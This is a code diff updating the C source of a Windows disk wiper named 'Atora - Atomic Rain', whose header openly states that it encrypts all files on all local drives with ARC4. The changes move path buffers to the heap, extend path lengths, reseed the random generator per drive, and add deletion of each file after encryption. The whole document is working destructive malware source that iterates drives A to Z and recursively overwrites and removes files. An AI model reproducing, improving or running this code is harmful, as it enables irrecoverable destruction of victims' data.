@@ -1,11 +1,11 @@
 /*
   Name:             Atora - Atomic Rain. Windows version.
-  Version:          5.60/05.06.20
+  Version:          5.62/12.06.20
   Compiler:         TCC ver 0.9.27
   Class:            Files shredder for Windows. Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-2-256:        90d9e3fcf78f8ea6b75ea8f2af071be745cecbccbc64f829132a3e28923dbdcc
-  SHA-2-256_UPX:    00e217052ebf8c2d658b426e3d54d1d202a0cd27168edb3523ad36c648c3c50b
+  SHA-2-256:        6d3856bcbcc37b402ea58362c60df20eddaed846d188c4a66753be267f49a3c1
+  SHA-2-256_UPX:    7e5550ff5ac4fccf8c37af025119fd8153a5e6dd19d1f4f9e8c6b5198db52371
 */
 #include <io.h>
 #include <time.h>
@@ -16,7 +16,8 @@
 #include <string.h>
 #include <windows.h>
 
-#define BUFFER_SIZE 8192
+#define BUFFER_SIZE       8192
+#define WIN_MAX_PATH_LEN 32767
 
 char * PARAM_REWRITE_BYTE = "r+b";
 
@@ -26,6 +27,14 @@ char * t_one      = ".";
 char * t_two      = "..";
 
 size_t i, j;
+size_t len_dir_memory = (32767 * 4);
+
+typedef struct { /* 128 KiB == one catalog */
+  uint8_t new_path_of_file [WIN_MAX_PATH_LEN];
+  uint8_t file_of_path     [WIN_MAX_PATH_LEN];
+  uint8_t path_file        [WIN_MAX_PATH_LEN];
+  uint8_t path_for_delete  [WIN_MAX_PATH_LEN];
+} DIR_MEMORY;
 
 typedef struct {
   uint8_t data       [256];
@@ -87,8 +96,8 @@ long int size_of_file(FILE * f) {
   return result;
 }
 
-void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
-  FILE * file = fopen((char *)filename, PARAM_REWRITE_BYTE);
+void file_encrypt(MEMORY_CTX * ctx, const char * filename) {
+  FILE * file = fopen(filename, PARAM_REWRITE_BYTE);
 
   if (file == NULL) {
     return;
@@ -130,36 +139,42 @@ void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
   WIN32_FIND_DATA wfd;
   HANDLE hfound;
 
-  uint8_t new_path_of_file[MAX_PATH];
-  uint8_t file_of_path[MAX_PATH];
-  uint8_t path_file[MAX_PATH];
-  uint8_t path_for_delete[MAX_PATH];
+  DIR_MEMORY * dir_memory = (DIR_MEMORY *)calloc(1, len_dir_memory);
 
-  strcpy(file_of_path, path);
-  strcat(file_of_path, slash);
-  strcpy(path_for_delete, file_of_path);
-  strcat(file_of_path, mask);
+  if (dir_memory == NULL) {
+    return;
+  }
 
-  if ((hfound = FindFirstFile(file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
+  strcpy(dir_memory->file_of_path, path);
+  strcat(dir_memory->file_of_path, slash);
+  strcpy(dir_memory->path_for_delete, dir_memory->file_of_path);
+  strcat(dir_memory->file_of_path, mask);
+
+  if ((hfound = FindFirstFile(dir_memory->file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
     do {
       if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
         if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
-          strcpy(path_file, path_for_delete);
-          strcat(path_file, wfd.cFileName);
+          strcpy(dir_memory->path_file, dir_memory->path_for_delete);
+          strcat(dir_memory->path_file, wfd.cFileName);
 
           generate_key(ctx);
-          file_encrypt(ctx, path_file);
+          file_encrypt(ctx, (char *)(dir_memory->path_file));
+          (void)remove((char *)(dir_memory->path_file));
         }
         else {
-          strcpy(new_path_of_file, path);
-          strcat(new_path_of_file, slash);
-          strcat(new_path_of_file, wfd.cFileName);
+          strcpy(dir_memory->new_path_of_file, path);
+          strcat(dir_memory->new_path_of_file, slash);
+          strcat(dir_memory->new_path_of_file, wfd.cFileName);
 
-          search_all_files(ctx, new_path_of_file, mask);
+          search_all_files(ctx, dir_memory->new_path_of_file, mask);
         }
       }
     } while(FindNextFile(hfound, &wfd) != 0);
   }
+
+  memset((void *)dir_memory, 0x00, len_dir_memory);
+  free((void *)dir_memory);
+  dir_memory = NULL;
 
   FindClose(hfound);
 }
@@ -183,10 +198,11 @@ int main (void) {
   MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);
 
   if (memory != NULL) {
-    srand((uint32_t)time(NULL));
 
     for (uint8_t disk = 'A'; disk <= 'Z'; disk++) {
       if (checklogicaldisk(disk) == 0) {
+        srand((uint32_t)time(NULL));
+
         local_disk[0] = disk;
         search_all_files(memory, local_disk, expansion);
       }
